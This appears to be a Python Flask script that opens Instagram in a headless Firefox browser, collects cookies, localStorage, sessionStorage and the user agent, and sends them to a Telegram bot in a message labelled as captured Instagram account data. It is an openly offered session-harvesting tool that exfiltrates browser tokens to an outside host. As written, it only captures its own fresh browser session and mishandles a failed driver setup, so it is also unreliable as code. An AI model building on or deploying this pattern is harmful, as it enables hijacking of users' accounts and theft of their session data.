from flask import Flask, request
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options  # Import Firefox Options
import time
import json
import logging
import requests
import base64

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app initialization
app = Flask(__name__)

# Telegram bot details
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

def send_to_telegram(data):
    """Send captured data to Telegram bot."""
    message = f"🔓 Instagram Account Data 🔓\n\n"
    message += f"🍪 Cookies:\n{json.dumps(data['cookies'], indent=2)[:500]}...\n\n"
    message += f"💾 LocalStorage:\n{json.dumps(data['localStorage'], indent=2)[:500]}...\n\n"
    message += f"📦 SessionStorage:\n{json.dumps(data['sessionStorage'], indent=2)[:500]}...\n\n"
    message += f"🌐 UserAgent:\n{data['userAgent']}\n\n"
    message += "✅ Data collected successfully!"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        logger.info("Data sent to Telegram successfully.")
    else:
        logger.error(f"Failed to send data to Telegram: {response.text}")

def setup_driver():
    """Set up the Firefox WebDriver with options."""
    firefox_options = Options()
    firefox_options.add_argument("--headless")
    firefox_options.add_argument("--no-sandbox")
    firefox_options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Firefox(options=firefox_options)
    return driver

def capture_data(driver):
    """Capture cookies, local storage, session storage, and user agent."""
    cookies = driver.get_cookies()
    local_storage = driver.execute_script("var ls = window.localStorage, items = {}; "
                                          "for (var i = 0, k; i < ls.length; ++i) "
                                          "  items[k = ls.key(i)] = ls.getItem(k); "
                                          "return items; ")
    session_storage = driver.execute_script("var ss = window.sessionStorage, items = {}; "
                                            "for (var i = 0, k; i < ss.length; ++i) "
                                            "  items[k = ss.key(i)] = ss.getItem(k); "
                                            "return items; ")
    user_agent = driver.execute_script("return navigator.userAgent;")

    return {
        "cookies": cookies,
        "localStorage": local_storage,
        "sessionStorage": session_storage,
        "userAgent": user_agent
    }

@app.route('/start', methods=['POST'])
def start_session():
    """Endpoint to start a new session and open Instagram."""
    try:
        driver = setup_driver()  # Set up a new browser session
        driver.get("https://www.instagram.com/")  # Open Instagram
        
        # Wait for the page to load
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        logger.info("Instagram page loaded successfully.")

        # Capture data
        data = capture_data(driver)
        
        # Send data to Telegram
        send_to_telegram(data)

        return {"status": "success", "message": "Session started and data sent to Telegram."}, 200
    except Exception as e:
        logger.error(f"Error during session: {str(e)}")
        return {"status": "error", "message": str(e)}, 500
    finally:
        driver.quit()  # Make sure to quit the driver session

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
